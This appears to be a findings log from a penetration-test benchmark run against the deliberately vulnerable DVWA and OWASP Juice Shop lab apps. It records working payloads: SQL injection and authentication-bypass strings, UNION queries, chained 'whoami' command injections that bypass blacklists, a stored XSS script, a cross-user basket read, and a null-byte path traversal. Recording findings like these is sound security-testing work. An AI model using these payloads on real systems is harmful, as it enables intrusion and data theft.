findings.title: SQL Injection via unsanitized 'id' parameter in SQLi page (DVWA low)
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records, confirming boolean-based SQLi (unioned boolean short-circuits WHERE clause to always-true across all rows): ID: 1' OR '1'='1 First name: admin Surname: admin | ID: 1' OR '1'='1 First name: Gordon Surname: Brown | ID: 1' OR '1'='1 First name: Hack Surname: Me | ID: 1' OR '1'='1 First name: Pablo Surname: Picasso | ID: 1' OR '1'='1 First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned the empty result page with no 'First name'/'Surname' records at all (just 'User ID:' prompt). This differential TRUE(5 rows)/FALSE(0 rows) behavior confirms unsanitized string concatenation into SQL query.

findings.title: OS Command Injection via 'ip' parameter in Ping utility (DVWA low)
findings.response_evidence: [security=low] Payload ip=127.0.0.1; whoami caused the application to execute the chained shell command after the ping. Response body included normal ping output (PING 127.0.0.1 ... 4 packets transmitted, 4 received, 0% packet loss ...) immediately followed on its own line by the output of the injected 'whoami' command: 'www-data'. This confirms unsanitized shell command injection yielding web-process identity disclosure.

findings.title: Stored XSS via guestbook 'mtxMessage' field (DVWA low)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ body: txtName=tester&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (session=dvwa_admin, via http_request bypassing client-side maxlength=50 HTML attribute since the canary is 51 chars)
findings.response_evidence: [security=low] POST of the script canary into mtxMessage was accepted and stored by the server (server-side only truncates/validates via maxlength on the client; raw HTTP POST bypasses this and the guestbook entry for name 'tester' was persisted, visible on subsequent GETs as 'Name: tester Message:' with the script tag present in the raw HTML though stripped from the plain-text visible_text extraction). On re-loading the stored guestbook page in an authenticated Playwright browser session, the injected script executed.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1. browser_read_dom("#test_token") returned inner_text/inner_html_excerpt: "window.xss_flag=1", confirming the injected <script id="test_token"> tag was rendered and executed by the browser as stored HTML (not encoded), proving persistent Stored XSS.

findings.title: OS Command Injection via pipe bypass of ';' / '&&' blacklist (medium)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in visible_text
findings.response_evidence: [security=medium] Page confirmed 'Security Level: medium' prior to testing. Payload ip=127.0.0.1| whoami (pipe with trailing space) bypassed the medium-level blacklist (which strips ';' and '&&' via str_replace but not '|'). Response visible_text included: "Enter an IP address: www-data" and pre_blocks returned exactly ["www-data"], confirming execution of the injected `whoami` command returning the web-process identity www-data.

findings.title: SQL Injection via numeric boolean bypass of quote-escaping (medium)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in visible_text
POST http://dvwa/vulnerabilities/sqli/ (dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'} (TRUE case)
POST http://dvwa/vulnerabilities/sqli/ (dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'} (FALSE case)
findings.response_evidence: [security=medium] Page confirmed 'Security Level: medium' and form id field is a <select> dropdown (values 1-5), but raw POST body with numeric boolean payload bypassed the dropdown constraint (medium level escapes quotes via mysqli_real_escape_string but does not validate numeric input). TRUE payload id=1 OR 1=1 returned ALL 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — pre_blocks confirmed 5 distinct ID/First name/Surname records. FALSE payload id=1 AND 1=2 returned zero records — visible_text/pre_blocks contained no "ID:" result blocks at all, only the dropdown and page chrome. This differential (5 records vs 0 records) confirms the SQL injection.

findings.title: OS Command Injection via pipe (no trailing space) bypasses high-security blacklist on /vulnerabilities/exec/
findings.response_evidence: [security=high] Footer confirms 'Security Level: high'. Response HTML visible_text includes: 'Vulnerability: Command Injection ... Ping a device Enter an IP address: www-data More Information ...'. pre_blocks array returned by server == ['www-data'], i.e., the command output block contains exactly 'www-data', proving the injected `|whoami` (pipe with NO trailing space) executed server-side and disclosed the web-process identity, bypassing the high-security blacklist which blocks ';', '&&', and '| ' (pipe+space) but not a bare '|' immediately followed by the command.

findings.title: SQL Injection via out-of-band session id (session-input.php) with trailing comment bypasses LIMIT 1 at high security
findings.response_evidence: [security=high] Footer on all responses confirms 'Security Level: high'. TRUE payload id=1' OR '1'='1' # stored via session-input.php, then GET /vulnerabilities/sqli/ rendered 5 seeded user records in pre_blocks: \"ID: 1' OR '1'='1' # / First name: admin / Surname: admin\", \"... First name: Gordon / Surname: Brown\", \"... First name: Hack / Surname: Me\", \"... First name: Pablo / Surname: Picasso\", \"... First name: Bob / Surname: Smith\" — i.e. the injected OR '1'='1' combined with trailing '#' comment successfully neutralized the appended 'LIMIT 1' clause and returned all rows instead of just one. FALSE payload id=1' AND '1'='2' # produced a page with empty pre_blocks / no ID-First name-Surname records at all (visible_text shows only 'Click here to change your ID .' with no result rows), confirming zero records returned. The clear TRUE(5 rows)/FALSE(0 rows) differential proves boolean-based SQL injection survives the high-security filtering (addslashes-style escaping) because the trailing '#' comments out the appended LIMIT clause.

findings.title: SQL Injection results rendering on /vulnerabilities/sqli/ reflects out-of-band session-input.php injection at high security
findings.response_evidence: [security=high] Confirmed combined flow: at high security, GET /vulnerabilities/sqli/ has no local id input (forms:[]) and relies entirely on the id value previously POSTed to session-input.php. After TRUE payload, GET returned 5 full user records (admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith) in pre_blocks. After FALSE payload, GET returned zero records. This confirms the GET endpoint is vulnerable as part of the out-of-band SQLi flow at high security — same vulnerability chain as the session-input.php finding.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (baseline, mapping phase) -> 200 {UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3, BasketId:6}}]}

GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, requesting acct1's basket id=6) -> 200 returns SAME data: UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3,BasketId:6}}]
findings.response_evidence: Authenticated as juiceshop_acct2 (own_basket_id=7, email acct2_bench@juiceshop.local), GET /rest/basket/6 returned HTTP 200 with body: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99,...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. This is acct1's basket (UserId 22, not acct2's own UserId/basket 7), containing acct1's distinct seeded item "Apple Juice (1000ml)" with quantity 3. No authorization check prevented acct2 from retrieving another user's basket by ID — confirms Broken Object Level Authorization (CWE-639).

findings.title: Login Authentication-Bypass SQL Injection via email field
findings.response_evidence: POST to /rest/user/login with email payload `' OR 1=1--` and arbitrary password returned HTTP 200 (not 401) with a valid authentication object: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The returned identity "umail":"admin@juice-sh.op" confirms the SQL injection in the email field bypassed password verification and authenticated as the first user (admin) in the users table — the classic Juice Shop login bypass. A valid JWT auth token was issued without knowing admin's password, confirming CWE-89.

findings.title: Product-Search SQL Injection (error-based and UNION-based)
request_sequence: GET /rest/products/search?q=qwert%27 session=unauth -> HTTP 500 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: Step 1: q=qwert' (single unescaped quote) caused HTTP 500 with body containing 'Error: SQLITE_ERROR: near \"'%'\": syntax error' — proves the q parameter is concatenated directly into a raw SQL LIKE query without sanitization. Step 2: q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (9-column UNION matching the products table's column count, with closing parens/comment to neutralize the original query) returned HTTP 200 with a crafted/benign result row where each field is the literal UNION-injected integer (name:2, description:3, price:4, etc. instead of real product data) — confirming successful UNION-based SQL injection execution against the backend SQLite database. Both pieces of evidence together confirm CWE-89 in the product search endpoint.

findings.title: Open Directory Listing Exposes Confidential Acquisitions Memo (/ftp/)
findings.response_evidence:
1) GET /ftp/ returned HTTP 200 with a serve-index directory listing enumerating files including 'acquisitions.md 909' along with other sensitive-looking files (incident-support.kdbx, announcement_encrypted.md, package.json.bak, etc.) — confirming an open directory listing vulnerability.
2) GET /ftp/acquisitions.md directly returned HTTP 200, content-type text/markdown, with body: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news."
This confirms both the directory listing disclosure and retrieval of the confidential acquisition memo text.

findings.title: Poison Null-Byte Path Traversal Bypasses File-Extension Filter on /ftp/ (package.json.bak)
findings.response_evidence:
1) GET /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)' confirming the extension-allowlist filter blocks direct .bak access.
2) GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content-type application/octet-stream, with full contents of the restricted package.json backup file, e.g.: '{\n  "name": "juice-shop",\n  "version": "6.2.0-SNAPSHOT", ... "dependencies": {...}, "devDependencies": {...} ...'. This demonstrates the filter inspects only the trailing .md string while the underlying filesystem call truncates the path at the null byte, serving the original package.json.bak content — a confirmed poison null-byte path traversal filter bypass.
